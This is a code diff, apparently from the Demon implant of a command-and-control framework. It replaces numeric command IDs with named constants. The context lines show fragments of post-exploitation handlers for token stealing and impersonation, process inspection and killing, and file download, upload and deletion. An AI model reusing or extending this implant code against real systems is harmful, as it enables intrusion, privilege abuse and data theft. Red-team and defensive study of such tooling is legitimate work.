@@ -186,7 +186,7 @@ VOID CommandJob( PPARSER Parser )
 
     switch ( Command )
     {
-        case 0x1: // list
+        case DEMON_COMMAND_JOB_LIST:
         {
             PUTS( "Job::list" )
             PJOB_DATA JobList = Instance.Jobs;
@@ -209,7 +209,7 @@ VOID CommandJob( PPARSER Parser )
             break;
         }
 
-        case 0x2: // suspend
+        case DEMON_COMMAND_JOB_SUSPEND:
         {
             PUTS( "Job::suspend" )
             DWORD JobID   = ParserGetInt32( Parser );
@@ -223,7 +223,7 @@ VOID CommandJob( PPARSER Parser )
             break;
         }
 
-        case 0x3: // resume
+        case DEMON_COMMAND_JOB_RESUME:
         {
             PUTS( "Job::resume" )
             DWORD JobID   = ParserGetInt32( Parser );
@@ -235,7 +235,7 @@ VOID CommandJob( PPARSER Parser )
             break;
         }
 
-        case 0x4: // kill & remove
+        case DEMON_COMMAND_JOB_KILL_REMOVE:
         {
             PUTS( "Job::kill" )
             DWORD JobID   = ParserGetInt32( Parser );
@@ -261,7 +261,7 @@ VOID CommandProc( PPARSER Parser )
 
     switch ( SubCommand )
     {
-        case 2: PUTS("Proc::Modules")
+        case DEMON_COMMAND_PROC_MODULES: PUTS("Proc::Modules")
         {
             PROCESS_BASIC_INFORMATION ProcessBasicInfo = { 0 };
             UINT32                    ProcessID        = 0;
@@ -330,7 +330,7 @@ VOID CommandProc( PPARSER Parser )
             break;
         }
 
-        case 3: PUTS("Proc::Grep")
+        case DEMON_COMMAND_PROC_GREP: PUTS("Proc::Grep")
         {
             PSYSTEM_PROCESS_INFORMATION SysProcessInfo  = NULL;
             PSYSTEM_PROCESS_INFORMATION PtrProcessInfo  = NULL; /* is going to hold the original pointer of SysProcessInfo */
@@ -414,7 +414,7 @@ VOID CommandProc( PPARSER Parser )
             break;
         }
 
-        case 4: PUTS( "Proc::Create" )
+        case DEMON_COMMAND_PROC_CREATE: PUTS( "Proc::Create" )
         {
             // TODO: finish this
             PROCESS_INFORMATION ProcessInfo     = { 0 };
@@ -463,7 +463,7 @@ VOID CommandProc( PPARSER Parser )
             break;
         }
 
-        case 6: PUTS( "Proc::Memory" )
+        case DEMON_COMMAND_PROC_MEMORY: PUTS( "Proc::Memory" )
         {
             DWORD                    ProcessID   = ParserGetInt32( Parser );
             DWORD                    QueryProtec = ParserGetInt32( Parser );
@@ -526,7 +526,7 @@ VOID CommandProc( PPARSER Parser )
             break;
         }
 
-        case 7: PUTS( "Proc::Kill" )
+        case DEMON_COMMAND_PROC_KILL: PUTS( "Proc::Kill" )
         {
             DWORD  dwProcessID = ParserGetInt32( Parser );
             HANDLE hProcess    = NULL;
@@ -655,7 +655,7 @@ VOID CommandFS( PPARSER Parser )
 
     switch ( Command )
     {
-        case 1: PUTS( "FS::Dir" )
+        case DEMON_COMMAND_FS_DIR: PUTS( "FS::Dir" )
         {
             WIN32_FIND_DATAW FindData      = { 0 };
             LPWSTR           Path          = NULL;
@@ -738,7 +738,7 @@ VOID CommandFS( PPARSER Parser )
             break;
         }
 
-        case 2: PUTS( "FS::Download" )
+        case DEMON_COMMAND_FS_DOWNLOAD: PUTS( "FS::Download" )
         {
             PDOWNLOAD_DATA Download = NULL;
             BUFFER         FileName = { 0 };
@@ -821,7 +821,7 @@ VOID CommandFS( PPARSER Parser )
             break;
         }
 
-        case 3: PUTS( "FS::Upload" )
+        case DEMON_COMMAND_FS_UPLOAD: PUTS( "FS::Upload" )
         {
             DWORD  FileSize = 0;
             DWORD  NameSize = 0;
@@ -866,7 +866,7 @@ VOID CommandFS( PPARSER Parser )
             break;
         }
 
-        case 4: PUTS( "FS::Cd" )
+        case DEMON_COMMAND_FS_CD: PUTS( "FS::Cd" )
         {
             DWORD  PathSize = 0;
             LPWSTR Path     = ParserGetBytes( Parser, &PathSize );
@@ -884,7 +884,7 @@ VOID CommandFS( PPARSER Parser )
             break;
         }
 
-        case 5: PUTS( "FS::Remove" )
+        case DEMON_COMMAND_FS_REMOVE: PUTS( "FS::Remove" )
         {
             DWORD  PathSize = 0;
             LPWSTR Path     = ParserGetBytes( Parser, &PathSize );
@@ -919,7 +919,7 @@ VOID CommandFS( PPARSER Parser )
             break;
         }
 
-        case 6: PUTS( "FS::Mkdir" )
+        case DEMON_COMMAND_FS_MKDIR: PUTS( "FS::Mkdir" )
         {
             DWORD  PathSize = 0;
             LPWSTR Path     = ParserGetBytes( Parser, &PathSize );
@@ -935,7 +935,7 @@ VOID CommandFS( PPARSER Parser )
             break;
         }
 
-        case 7: PUTS( "FS::Copy" )
+        case DEMON_COMMAND_FS_COPY: PUTS( "FS::Copy" )
         {
             DWORD  FromSize = 0;
             DWORD  ToSize   = 0;
@@ -962,7 +962,7 @@ VOID CommandFS( PPARSER Parser )
             break;
         }
 
-        case 9: PUTS( "FS::GetPwd" )
+        case DEMON_COMMAND_FS_GET_PWD: PUTS( "FS::GetPwd" )
         {
             WCHAR Path[ MAX_PATH * 2 ] = { 0 };
             DWORD Return               = 0;
@@ -978,7 +978,7 @@ VOID CommandFS( PPARSER Parser )
             break;
         }
 
-        case 10: PUTS( "FS::Cat" )
+        case DEMON_COMMAND_FS_CAT: PUTS( "FS::Cat" )
         {
             DWORD  FileSize = 0;
             DWORD  Read     = 0;
@@ -1236,7 +1236,7 @@ VOID CommandToken( PPARSER Parser )
     PackageAddInt32( Package, Command );
     switch ( Command )
     {
-        case 0x1: PUTS( "Token::Impersonate" )
+        case DEMON_COMMAND_TOKEN_IMPERSONATE: PUTS( "Token::Impersonate" )
         {
             DWORD            dwTokenID = ParserGetInt32( Parser );
             PTOKEN_LIST_DATA TokenData = NULL;
@@ -1283,7 +1283,7 @@ VOID CommandToken( PPARSER Parser )
             break;
         }
 
-        case 0x2: PUTS( "Token::Steal" )
+        case DEMON_COMMAND_TOKEN_STEAL: PUTS( "Token::Steal" )
         {
             DWORD  TargetPid   = ParserGetInt32( Parser );
             HANDLE StolenToken = TokenSteal( TargetPid );
@@ -1314,7 +1314,7 @@ VOID CommandToken( PPARSER Parser )
             break;
         }
 
-        case 0x3: PUTS( "Token::List" )
+        case DEMON_COMMAND_TOKEN_LIST: PUTS( "Token::List" )
         {
             PTOKEN_LIST_DATA TokenList  = Instance.Tokens.Vault;
             DWORD            TokenIndex = 0;
@@ -1340,7 +1340,7 @@ VOID CommandToken( PPARSER Parser )
             break;
         }
 
-        case 0x4: PUTS( "Token::PrivsGetOrList" )
+        case DEMON_COMMAND_TOKEN_PRIVSGET_OR_LIST: PUTS( "Token::PrivsGetOrList" )
         {
             PTOKEN_PRIVILEGES TokenPrivs = NULL;
             DWORD             TPSize      = 0;
@@ -1390,7 +1390,7 @@ VOID CommandToken( PPARSER Parser )
             break;
         }
 
-        case 0x5: PUTS( "Token::Make" )
+        case DEMON_COMMAND_TOKEN_MAKE: PUTS( "Token::Make" )
         {
             DWORD  dwUserSize     = 0;
             DWORD  dwPasswordSize = 0;
@@ -1452,8 +1452,8 @@ VOID CommandToken( PPARSER Parser )
             break;
         }
 
-        case 0x6: PUTS( "Token::GetUID" )
-            {
+        case DEMON_COMMAND_TOKEN_GET_UID: PUTS( "Token::GetUID" )
+        {
             DWORD           cbSize     = sizeof( TOKEN_ELEVATION );
             TOKEN_ELEVATION Elevation  = { 0 };
             HANDLE          hToken     = TokenCurrentHandle( );
@@ -1489,7 +1489,7 @@ VOID CommandToken( PPARSER Parser )
             break;
         }
 
-        case 0x7: PUTS( "Token::Revert" )
+        case DEMON_COMMAND_TOKEN_REVERT: PUTS( "Token::Revert" )
         {
             BOOL Success = Instance.Win32.RevertToSelf();
 
@@ -1504,7 +1504,7 @@ VOID CommandToken( PPARSER Parser )
             break;
         }
 
-        case 0x8: PUTS( "Token::Remove" )
+        case DEMON_COMMAND_TOKEN_REMOVE: PUTS( "Token::Remove" )
         {
             DWORD TokenID = ParserGetInt32( Parser );
 
@@ -1514,7 +1514,7 @@ VOID CommandToken( PPARSER Parser )
             break;
         }
 
-        case 0x9: PUTS( "Token::Clear" )
+        case DEMON_COMMAND_TOKEN_CLEAR: PUTS( "Token::Clear" )
         {
 
             TokenClear();
@@ -2421,7 +2421,7 @@ VOID CommandTransfer( PPARSER Parser )
 
     switch ( Command )
     {
-        case 0x0: PUTS( "Transfer::list" )
+        case DEMON_COMMAND_TRANSFER_LIST: PUTS( "Transfer::list" )
         {
             for ( ;; )
             {
@@ -2438,7 +2438,7 @@ VOID CommandTransfer( PPARSER Parser )
             break;
         }
 
-        case 0x1: PUTS( "Transfer::stop" )
+        case DEMON_COMMAND_TRANSFER_STOP: PUTS( "Transfer::stop" )
         {
             FileID = ParserGetInt32( Parser );
 
@@ -2465,7 +2465,7 @@ VOID CommandTransfer( PPARSER Parser )
             break;
         }
 
-        case 0x2: PUTS( "Transfer::resume" )
+        case DEMON_COMMAND_TRANSFER_RESUME: PUTS( "Transfer::resume" )
         {
             FileID = ParserGetInt32( Parser );
 
@@ -2493,7 +2493,7 @@ VOID CommandTransfer( PPARSER Parser )
             break;
         }
 
-        case 0x3: PUTS( "Transfer::remove" )
+        case DEMON_COMMAND_TRANSFER_REMOVE: PUTS( "Transfer::remove" )
         {
             FileID = ParserGetInt32( Parser );
 
